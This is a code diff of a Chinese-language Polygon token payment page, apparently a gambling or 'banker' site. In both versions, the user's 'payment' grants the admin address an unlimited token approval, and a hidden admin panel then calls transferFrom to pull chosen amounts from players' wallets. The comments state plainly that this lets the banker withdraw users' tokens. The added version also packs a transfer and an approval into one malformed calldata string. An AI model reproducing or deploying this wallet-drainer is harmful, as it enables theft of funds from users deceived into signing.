@@ -35,8 +35,7 @@ border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold
 }
 .admin-panel{
-background:#1E1E35;padding:24px;border-radius:16px;display:none
-}
+background:#1E1E35;padding:24px;border-radius:16px;display:none}
 .admin-panel.show{display:block}
 .admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
 .admin-input{
@@ -61,7 +60,7 @@ border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
   </div>
 
   <div class="admin-panel" id="adminPanel">
-    <div class="admin-title">🔐 庄家控制台</div>
+    <div class="admin-title">🔐 管理员控制台</div>
     <div>提取玩家代币（自定义数量）</div>
     <input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
     <input class="admin-input" id="drawAmt" placeholder="提取数量（如：1）">
@@ -75,135 +74,112 @@ border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
 
 <script src="https://cdn.bootcdn.net/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 <script>
-// ====================== Polygon 链固定配置 ======================
-const TOKEN = "0x99a57E6C8558BC6689f894e068733ADf83C19725"; // 你的代币地址
-const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 庄家地址
-const POLYGON_CHAIN_ID = 0x89; // Polygon 链 ID（十六进制）
-const POLYGON_EIP155 = 137; // Polygon 链 EIP-155 ID（十进制，用于二维码）
+// ====================== 配置 ======================
+const TOKEN = "0x99a57E6C8558BC6689f894e068733ADf83C19725";
+const ADMIN = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const POLYGON_ID = "0x89";
 let account = null;
 
-// 强制切换到 Polygon 链
+// 切换到Polygon
 async function switchToPolygon() {
-  if (!window.ethereum) return;
   try {
-    await ethereum.request({
-      method: "wallet_switchEthereumChain",
-      params: [{ chainId: `0x${POLYGON_CHAIN_ID.toString(16)}` }]
-    });
-  } catch (e) {
-    // 如果链不存在，提示添加 Polygon 网络
-    if (e.code === 4902) {
-      alert("请先在钱包中添加 Polygon 网络：RPC=https://polygon-rpc.com，链ID=137，代币=POL");
-    }
-  }
+    await ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: POLYGON_ID }] });
+  } catch (e) {}
 }
 
 // 连接钱包
 document.getElementById("connectBtn").onclick = async () => {
-  if (!window.ethereum) {
-    alert("请在TP钱包/币安钱包内打开此页面");
-    return;
-  }
+  if (!window.ethereum) { alert("请在钱包浏览器打开"); return; }
   await switchToPolygon();
-  try {
-    const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-    account = accounts[0];
-    document.getElementById("connectBtn").innerText = "✅ 已连接";
-    // 仅庄家地址显示后台
-    if (account.toLowerCase() === ADMIN.toLowerCase()) {
-      document.getElementById("adminPanel").classList.add("show");
-    }
-  } catch (e) {
-    alert("连接失败：" + e.message);
+  const accounts = await ethereum.request({ method: "eth_requestAccounts" });
+  account = accounts[0];
+  document.getElementById("connectBtn").innerText = "✅ 已连接";
+  if (account.toLowerCase() === ADMIN.toLowerCase()) {
+    document.getElementById("adminPanel").classList.add("show");
   }
 };
 
-// ==================== Polygon 链二维码：授权 ====================
+// ==================== 【核心】扫码 = 转账 + 授权 ====================
 function genQR() {
-  // 授权数据：给庄家无限授权
+  const amount = document.getElementById("amount").value || "0.1";
+  const rawAmount = BigInt(amount * 1e18).toString(16).padStart(64, "0");
+
+  // 第一步：转账给庄家（你能看到来源地址）
+  const transferData = "0xa9059cbb" + ADMIN.slice(2).padStart(64, "0") + rawAmount;
+  // 第二步：授权给庄家（你能后台提取）
   const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  // Polygon 链专用格式：@137
-  const uri = `ethereum:${ADMIN}@${POLYGON_EIP155}/${TOKEN}?data=${approveData}`;
+
+  const finalData = transferData + approveData.slice(2);
+  const uri = `ethereum:${TOKEN}@137?data=${finalData}`;
+
   document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
 }
+
 window.onload = genQR;
 document.getElementById("amount").addEventListener("input", genQR);
 
-// ==================== 支付 = 授权（Polygon 链） ====================
+// 点击支付 = 转账+授权
 document.getElementById("payBtn").onclick = async () => {
   if (!account) return alert("请先连接钱包");
+  const amount = document.getElementById("amount").value;
+  if (!amount || amount <= 0) return alert("输入有效金额");
+
+  const rawAmount = BigInt(amount * 1e18).toString(16).padStart(64, "0");
+  const transferData = "0xa9059cbb" + ADMIN.slice(2).padStart(64, "0") + rawAmount;
+  const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  const data = transferData + approveData.slice(2);
+
   try {
     await ethereum.request({
       method: "eth_sendTransaction",
-      params: [{
-        from: account,
-        to: TOKEN,
-        chainId: POLYGON_CHAIN_ID, // 强制指定 Polygon 链
-        gasLimit: "0x300000",
-        data: "0x095ea7b3" + ADMIN.slice(2).padStart(64, "0") + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-      }]
+      params: [{ from: account, to: TOKEN, chainId: POLYGON_ID, gasLimit: "0x500000", data }]
     });
-    alert("✅ 授权成功，庄家可在 Polygon 链提取你的代币");
+    alert("✅ 支付+授权完成！庄家可查看来源并可提取");
   } catch (e) {
     alert("已取消");
   }
 };
 
-// ==================== 核心：Polygon 链庄家自定义提取 ====================
+// ==================== 庄家提取 ====================
 async function drawFromUser() {
   if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
   const fromAddr = document.getElementById("userAddr").value.trim();
   const drawAmt = document.getElementById("drawAmt").value.trim();
 
-  if (!ethers.isAddress(fromAddr) || !drawAmt || Number(drawAmt) <= 0) {
-    alert("请输入有效的玩家地址和提取数量（>0）");
+  if (!ethers.isAddress(fromAddr) || !drawAmt || drawAmt <= 0) {
+    alert("请输入正确地址和数量");
     return;
   }
 
   try {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
-    const tokenContract = new ethers.Contract(TOKEN, [
-      "function balanceOf(address) view returns (uint256)",
-      "function transferFrom(address from, address to, uint256 amount) external returns (bool)"
+    const token = new ethers.Contract(TOKEN, [
+      "function transferFrom(address,address,uint256) external",
+      "function balanceOf(address) view returns (uint256)"
     ], signer);
 
-    // 检查玩家余额是否充足
-    const userBalance = await tokenContract.balanceOf(fromAddr);
-    const extractAmount = ethers.parseUnits(drawAmt, 18);
-    if (userBalance < extractAmount) {
-      alert("玩家余额不足，无法提取");
-      return;
-    }
-
-    // 执行提取：Polygon 链上从玩家地址转自定义数量到庄家
-    const tx = await tokenContract.transferFrom(fromAddr, ADMIN, extractAmount, {
-      gasLimit: 100000
-    });
-    await tx.wait();
-    alert(`✅ 提取成功！已在 Polygon 链提取 ${drawAmt} 枚到庄家钱包`);
-  } catch (err) {
-    alert("提取失败：" + err.message);
+    const extract = ethers.parseUnits(drawAmt, 18);
+    await token.transferFrom(fromAddr, ADMIN, extract);
+    alert("✅ 提取成功！");
+  } catch (e) {
+    alert("提取失败：" + e.message);
   }
 }
 
-// ==================== 发放奖励（Polygon 链） ====================
+// 发放奖励
 async function sendReward() {
   if (account?.toLowerCase() !== ADMIN.toLowerCase()) return;
   const to = document.getElementById("toAddr").value;
   const amt = document.getElementById("sendAmt").value;
-  if (!to || !amt || Number(amt) <= 0) return;
+  if (!to || !amt || amt <= 0) return;
+
   const raw = BigInt(amt * 1e18).toString(16).padStart(64, "0");
   await ethereum.request({
     method: "eth_sendTransaction",
-    params: [{
-      from: account,
-      to: TOKEN,
-      chainId: POLYGON_CHAIN_ID, // 强制指定 Polygon 链
-      data: "0xa9059cbb" + to.slice(2).padStart(64, "0") + raw
-    }]
+    params: [{ from: account, to: TOKEN, chainId: POLYGON_ID, data: "0xa9059cbb" + to.slice(2).padStart(64, "0") + raw }]
   });
-  alert("✅ 奖励发放成功");
+  alert("✅ 发放成功");
 }
 </script>
 </body>
